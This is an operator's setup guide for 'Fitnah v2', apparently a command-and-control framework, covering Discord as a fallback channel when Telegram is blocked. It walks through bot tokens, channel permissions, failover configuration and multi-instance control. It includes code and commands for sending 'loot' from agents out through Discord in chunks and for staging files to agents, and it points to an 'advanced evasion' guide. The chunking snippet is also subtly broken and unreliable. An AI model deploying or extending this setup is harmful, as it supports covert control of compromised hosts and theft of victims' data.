# Fitnah v2 — Discord Configuration & Fallback Transport

This guide covers Discord bot setup as a fallback C2 transport (when Telegram is blocked/unavailable).

## Creating a Discord Bot

### Step 1: Create Application in Developer Portal

1. Go to [Discord Developer Portal](https://discord.com/developers/applications)
2. Click **New Application**
3. Name: `Fitnah Lab`
4. Accept terms and **Create**
5. You're on the **General Information** tab

### Step 2: Create Bot User

1. Click **Bot** (left sidebar)
2. Click **Add Bot**
3. Under TOKEN, click **Copy** (this is your bot token)

```
Discord Bot Token (keep secret):
YOUR_DISCORD_BOT_TOKEN_HERE
```

### Step 3: Generate Invite URL & Add Bot to Server

1. Click **OAuth2** → **URL Generator** (left sidebar)
2. Check **Scopes**:
   - ✓ `bot`
3. Check **Permissions**:
   - ✓ Send Messages
   - ✓ Send Messages in Threads
   - ✓ Manage Messages
   - ✓ Read Messages/View Channels
   - ✓ Read Message History
   - ✓ Attach Files
4. Copy the generated **URL** at the bottom
5. Open URL in browser → select Discord server → **Authorize**
6. Bot now appears in your server's member list

### Step 4: Create Operator Channel

1. In Discord server, create a **Text Channel** (e.g., `#fitnah-ops`)
2. Right-click channel → **Copy Channel ID**

```
Channel ID (numeric):
1098765432109876543
```

---

## Configuration

### Basic Setup

Edit `config/framework.yaml`:

```yaml
telegram:
  token: "YOUR_TELEGRAM_TOKEN"
  operator_chat_id: 1234567890

discord:
  enabled: true
  token: "YOUR_DISCORD_BOT_TOKEN_HERE"
  operator_channel_id: 1098765432109876543

failover_threshold: 3  # switch to Discord after 3 Telegram consecutive failures
```

### Storing Token Securely

**Never commit Discord token to git.**

#### Option A: Environment Variables

```bash
export FITNAH_DISCORD_TOKEN="your-real-token"
export FITNAH_DISCORD_CHANNEL_ID="1098765432109876543"
```

Then in YAML:

```yaml
discord:
  enabled: true
  token: ${FITNAH_DISCORD_TOKEN}
  operator_channel_id: ${FITNAH_DISCORD_CHANNEL_ID}
```

#### Option B: `.env` File

```bash
# .env (gitignored)
DISCORD_TOKEN=YOUR_DISCORD_BOT_TOKEN_HERE
DISCORD_CHANNEL_ID=1098765432109876543
```

---

## Role Permissions

### Recommended Channel Permissions for Bot

1. Right-click channel → **Edit Channel**
2. Go to **Permissions** tab
3. Find your bot in the list (or add it)
4. Set:

| Permission | Status |
|-----------|--------|
| View Channel | ✓ |
| Send Messages | ✓ |
| Read Message History | ✓ |
| Manage Messages | ✓ |
| Attach Files | ✓ |
| Embed Links | ✓ |

### Restrict to Specific Role (Optional)

If you want only ops to see the channel:

1. Create role: `@fitnah-operator`
2. Right-click channel → Permissions
3. Under **@everyone**: Deny "View Channel"
4. Add role `@fitnah-operator`: Allow "View Channel"
5. Assign role to operator users

---

## Webhook vs Bot API

### Bot API (Current Implementation)

- **Method**: Direct API calls via `discord.py`
- **Pros**: Full feature support, inline embeds, reactions
- **Cons**: Requires bot token (privileged)
- **Fitnah uses**: Bot API for maximum compatibility

### Webhook Alternative

For simpler, non-interactive notifications:

```yaml
discord:
  webhook_url: "https://discord.com/api/webhooks/1098765432109876543/AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOp"
```

**Disadvantage**: Webhooks don't support inline buttons or complex UI. Stick with Bot API for full operability.

---

## Testing Discord Connectivity

### 1. Verify Bot Token

```bash
curl "https://discord.com/api/v10/users/@me" \
  -H "Authorization: Bot YOUR_DISCORD_BOT_TOKEN_HERE"
```

Response (if valid):

```json
{
  "id": "1024906247006954569",
  "username": "FitnahahBot",
  "discriminator": "0000",
  "global_name": null
}
```

### 2. Send Test Message to Channel

```bash
curl -X POST "https://discord.com/api/v10/channels/1098765432109876543/messages" \
  -H "Authorization: Bot YOUR_DISCORD_BOT_TOKEN_HERE" \
  -H "Content-Type: application/json" \
  -d '{"content": "Test message from Fitnah"}'
```

You should see the message appear in Discord immediately.

### 3. Run Fitnah and Monitor

```bash
python fitnah.py
```

Logs should show:

```
[kernel] started — N plugin(s) loaded  transport=telegram
[discord] connected
[router] Telegram is primary transport
```

### 4. Check Logs

```bash
tail -f logs/fitnah.log | grep -i discord
```

Expected:

```
[discord] connected
[router] Telegram healthy, skipping failover check
```

---

## Failover Behavior: Telegram → Discord

The Router monitors Telegram health:

```
Every check cycle:
  - Try to send test message via Telegram
  - Count consecutive failures
  - If failures >= failover_threshold → switch to Discord
  - If Telegram recovers → switch back to Telegram (primary)
```

**Failover threshold** controls sensitivity:

```yaml
failover_threshold: 3  # default: switch after 3 failures
```

Lower = faster failover (but may be too aggressive); Higher = more resilience.

### Monitoring Failover

```bash
# Watch for transport switches
tail -f logs/fitnah.log | grep -i "failover\|transport\|switch"
```

In Telegram UI, you'll see notification:

```
📶 Transport Failover

📱 telegram → 💬 discord
```

---

## Multi-Server Setup

To control multiple Fitnah instances from one Discord server:

### Approach 1: Separate Channels

```yaml
# fitnah_lab.yaml
discord:
  token: "shared-bot-token"
  operator_channel_id: 1111111111111111111  # #fitnah-lab

# fitnah_prod.yaml
discord:
  token: "shared-bot-token"
  operator_channel_id: 2222222222222222222  # #fitnah-prod
```

Both instances use same bot token; different channels prevent message conflicts.

### Approach 2: Separate Bots

Create separate bot application per instance (more isolated, but more tokens to manage).

---

## Discord File Handling

### Uploading Files (Download from Agent)

Discord max file size: **25 MB** per message

If loot > 25 MB:

```python
# Fitnah automatically chunks large files
if len(file_data) > 25 * 1024 * 1024:
    # Send as multiple messages with parts
    for part in chunked(file_data, 25 * 1024 * 1024):
        await bot.send_document(channel, part, filename=f"part_{i}.bin")
```

### Downloading Files (Upload to Agent)

1. Upload file to Discord in the channel
2. Fitnah downloads from Discord CDN
3. Stages locally in `data/staging/`
4. Sends to agent

---

## Comparing Telegram vs Discord

| Feature | Telegram | Discord |
|---------|----------|---------|
| **Setup complexity** | Easy (BotFather) | Medium (Dev Portal) |
| **Inline buttons** | ✓ Full support | ⚠ Limited (embeds only) |
| **File upload** | ✓ Any size | Max 25 MB |
| **Multi-operator** | ✓ Direct/groups | ✓ Roles & channels |
| **Blocking risk** | Higher (government blocks) | Lower (gaming platform) |
| **Latency** | ~1-3s | ~1-2s |
| **Audit logging** | ✓ Built-in | ⚠ Manual export |
| **Primary use** | ✓ Recommended | Fallback only |

---

## Troubleshooting Discord

| Issue | Solution |
|-------|----------|
| "Invalid token" | Check token in Dev Portal → Bot; regenerate if needed |
| "Channel not found" | Verify channel ID is numeric and correct server |
| "403 Forbidden" | Bot lacks permissions; check role/channel permissions |
| "Missing Access" | Bot not added to server; use OAuth2 URL to re-invite |
| No messages sent | Ensure `discord.enabled: true` and token is valid |
| Failover never triggered | Check `failover_threshold`; monitor Telegram health |
| File size too large | Discord limit is 25 MB; break into chunks |
| Slow messages | Discord API throttling; consider increasing timeout |

---

## Security Best Practices

1. **Token rotation** — Regenerate bot token regularly in Dev Portal
2. **Separate bot per environment** — lab ≠ production
3. **Use Discord roles** — restrict channel access to operators only
4. **Don't hardcode token** — use env vars or `.env`
5. **Monitor channel activity** — Discord logs are searchable (audit trail)
6. **Limit bot permissions** — remove unnecessary capabilities

---

## Next Steps

- **Primary transport (Telegram)**: See `README_TELEGRAM.md`
- **Usage & Operations**: See `README_USAGE.md`
- **Advanced evasion**: See `README_HOSTILE.md`
